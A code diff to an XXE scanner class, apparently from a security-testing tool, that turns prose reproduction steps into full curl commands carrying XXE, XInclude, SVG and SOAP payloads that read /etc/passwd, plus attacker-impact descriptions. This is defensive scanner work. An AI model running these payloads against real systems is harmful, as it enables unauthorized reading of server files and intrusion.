@@ -231,35 +231,35 @@ class XXEScanner(ScannerBase):
 
         steps_map = {
             "in_band": [
-                f"Send POST request to {detection.url} with Content-Type: application/xml and an XXE payload containing an external entity",
+                f"curl -X POST '{detection.url}' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'",
                 f"Observe in response: {sig!r} — file content returned from server-side entity resolution",
-                "This confirms the XML parser processes external entities without restriction",
+                "An attacker can read arbitrary server files (SSH keys, source code, configs), perform SSRF, and potentially achieve RCE via expect:// or PHP wrappers",
             ],
             "error": [
-                f"Send POST request to {detection.url} with a malformed XXE payload that causes the parser to leak file content in error messages",
-                f"Observe in response: {sig!r} — file content leaked via parser error",
-                "This confirms error-based XXE is possible",
+                f"curl -X POST '{detection.url}' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///nonexistent\">%xxe;]>'",
+                f"Observe in response: {sig!r} — file content leaked via parser error messages",
+                "An attacker can read arbitrary server files through error-based XXE even when direct output is not returned",
             ],
             "xinclude": [
-                f"Send POST request to {detection.url} with an XInclude payload referencing a local file",
+                f"curl -X POST '{detection.url}' -H 'Content-Type: application/xml' -d '<root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\"/></root>'",
                 f"Observe in response: {sig!r} — file content included via XInclude",
-                "XInclude bypasses DOCTYPE restrictions — server processes <xi:include> even when DOCTYPE is blocked",
+                "XInclude bypasses DOCTYPE restrictions — an attacker can read files even when DOCTYPE declarations are blocked",
             ],
             "svg_upload": [
-                f"Upload an SVG file to {detection.url} containing an XXE payload with an external entity",
+                f"curl -X POST '{detection.url}' -F 'file=@payload.svg' where payload.svg contains: <?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>",
                 f"Observe in response: {sig!r} — file content returned in the rendered SVG",
-                "This confirms SVG XXE — the SVG parser processes external entities",
+                "An attacker can read arbitrary server files through SVG upload XXE, bypassing XML input restrictions",
             ],
             "soap": [
-                f"Send SOAP request to {detection.url} with SOAPAction header and an XXE payload in the SOAP body",
+                f"curl -X POST '{detection.url}' -H 'SOAPAction: \"urn:test\"' -H 'Content-Type: text/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Body>&xxe;</soap:Body>'",
                 f"Observe in response: {sig!r} — file content returned via SOAP XML entity",
-                "This confirms XXE in SOAP/XML-RPC endpoint",
+                "An attacker can read arbitrary server files through XXE in SOAP/XML-RPC endpoints, which are often overlooked during security reviews",
             ],
         }
         return steps_map.get(group, [
-            f"Send POST request to {detection.url} with XXE payload",
-            f"Observe in response: {sig!r}",
-            "This confirms XXE is possible",
+            f"curl -X POST '{detection.url}' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'",
+            f"Observe in response: {sig!r} — file content returned from server-side entity resolution",
+            "An attacker can read arbitrary server files (SSH keys, source code, configs), perform SSRF, and potentially achieve RCE",
         ])
 
     # ── Scan entry point ────────────────────────────────────────────────
